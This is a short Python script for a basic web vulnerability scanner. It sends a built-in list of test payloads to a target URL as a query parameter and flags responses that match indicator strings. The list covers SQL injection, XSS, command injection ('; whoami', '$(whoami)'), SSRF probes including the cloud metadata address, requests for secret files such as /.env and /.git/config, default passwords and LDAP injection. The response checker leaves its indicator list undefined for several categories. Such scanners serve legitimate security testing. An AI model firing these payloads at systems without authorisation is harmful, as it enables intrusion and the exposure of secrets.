import requests

# Basic payloads for each category (you can later load from files or user input)
default_payloads = {
    "SQLi": ["' OR '1'='1", "' AND 1=2--", "' OR 1=1--", "' UNION SELECT NULL--"],
    "XSS": ["<script>alert(1)</script>", "\" onmouseover=\"alert(1)", "'><svg onload=alert(1)>"],
    "CMD": ["; whoami", "&& whoami", "| whoami", "`whoami`", "$(whoami)"],
    "HTML": [ "<b>Test</b>", "<i>Italic</i>", "<img src=x onerror=alert(1)>"],
    "AccessControl": [
        "/admin", "/admin/", "/config", "/.git/", "/.env", 
        "/backup", "/backup.zip", "/dev", "/debug", "/private"
    ],
    "SSRF": [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254",  # AWS metadata IP
    "http://0.0.0.0",
    "http://internal.local",
    "http://example.com"  # benign test endpoint
    ],
    "AuthBypass": ["' OR '1'='1", "' OR 1=1 --", "admin'--", "' OR ''='",
                   "\" OR \"\"=\"","admin","password","admin123","root",
    ],
    "Misconfig": ["/.git/config","/phpinfo.php","/server-status","/admin/",
                  "/debug/","/.env","/config.php","/test/","/backup/","/logs/","/.DS_Store",
    ],
    "LDAPi": ["*","*)(&","*)|&","(|(user=*))","admin*)(&","*)(&(|(objectClass=*))"],
    "InsecureDesign": ["/admin","/account/1","/user/delete?id=1","/user/edit?id=2","/download?file=secret.txt"],

}

def scan_for_vulnerabilities(url, selected_payloads):
    results = {}

    for category, payloads in selected_payloads.items():
        if not payloads:
            continue

        results[category] = []
        for payload in payloads:
            try:
                test_url = f"{url}?input={payload}"
                response = requests.get(test_url, timeout=5)
                result = analyze_response(category, response.text)
                results[category].append((payload, result))
            except Exception as e:
                results[category].append((payload, f"Error: {e}"))

    return results

def analyze_response(category, response_text):
    """
    Very basic vulnerability indicator logic.
    """
    if category == "SQLi":
        indicators = ["SQL", "syntax", "mysql", "error"]
    elif category == "XSS":
        indicators = ["<script>", "alert", "onerror"]
    elif category == "CMD":
        indicators = ["uid=", "root", "bin/bash"]
    elif category == "HTML":
        indicators = ["<b>", "<i>", "<img"]
    elif category == "LDAPi":
        indicators = [
            "LDAPException", 
            "Invalid DN syntax", 
            "javax.naming", 
            "Directory Services", 
            "invalid filter", 
            "unexpected end of filter", 
            "Unbalanced parenthesis"
        ]

    for indicator in indicators:
        if indicator.lower() in response_text.lower():
            return "Potential Vulnerability"
    return "No Issue Detected"
